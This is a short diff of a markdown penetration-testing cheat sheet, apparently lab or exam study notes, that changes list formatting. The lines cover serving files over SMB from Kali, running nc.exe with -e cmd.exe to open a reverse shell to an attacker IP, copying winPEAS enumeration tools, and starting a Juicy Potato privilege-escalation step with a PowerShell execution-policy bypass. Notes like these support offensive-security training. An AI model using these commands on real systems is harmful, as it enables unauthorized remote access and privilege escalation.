@@ -423,9 +423,9 @@ or
 
 ##### Download a file in Windows via SMB
 > 1. *On Kali* ```smbserver.py -smb2support Share /home/jon/Downloads```
-> 2. *On Windows ```cmd.exe /c //192.168.49.174/Share/nc.exe -e cmd.exe 192.168.49.174 8082```
-> 3. copy \\192.168.49.174\Share\winPEASx64.exe
-> 4. copy \\192.168.49.174\Share\winPEASx86.exe
+> 1. *On Windows ```cmd.exe /c //192.168.49.174/Share/nc.exe -e cmd.exe 192.168.49.174 8082```
+> 1. ```copy \\192.168.49.174\Share\winPEASx64.exe```
+> 1. ```copy \\192.168.49.174\Share\winPEASx86.exe```
 	
 ### Juicy Potato
 > 1. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c .\GetCLSID.ps1
